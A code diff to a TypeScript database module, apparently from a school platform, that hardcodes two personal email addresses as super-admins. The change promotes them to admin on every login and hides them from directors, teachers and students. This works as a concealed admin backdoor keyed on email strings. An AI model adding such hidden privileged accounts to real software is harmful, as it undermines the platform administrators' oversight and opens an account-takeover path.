@@ -5,6 +5,16 @@ import { ENV } from './_core/env';
 
 let _db: ReturnType<typeof drizzle> | null = null;
 
+/**
+ * Platform-level super-admins. These users are automatically promoted to
+ * role='admin' on every login and are hidden from all non-super-admin user lists.
+ * Their admin status is never exposed to directors, teachers, or students.
+ */
+const SUPER_ADMIN_EMAILS = [
+  "paulharrymitchell@gmail.com",
+  "mitchellromi@gmail.com",
+] as const;
+
 // Lazily create the drizzle instance so local tooling can run without a DB.
 export async function getDb() {
   if (!_db && process.env.DATABASE_URL) {
@@ -101,7 +111,8 @@ export async function upsertUser(user: InsertUser): Promise<void> {
     if (user.role !== undefined) {
       values.role = user.role;
       updateSet.role = user.role;
-    } else if (user.openId === ENV.ownerOpenId) {
+    } else if (user.openId === ENV.ownerOpenId || (user.email && (SUPER_ADMIN_EMAILS as readonly string[]).includes(user.email))) {
+      // Platform-level super-admins always get role='admin' regardless of what was stored
       values.role = 'admin';
       updateSet.role = 'admin';
     }
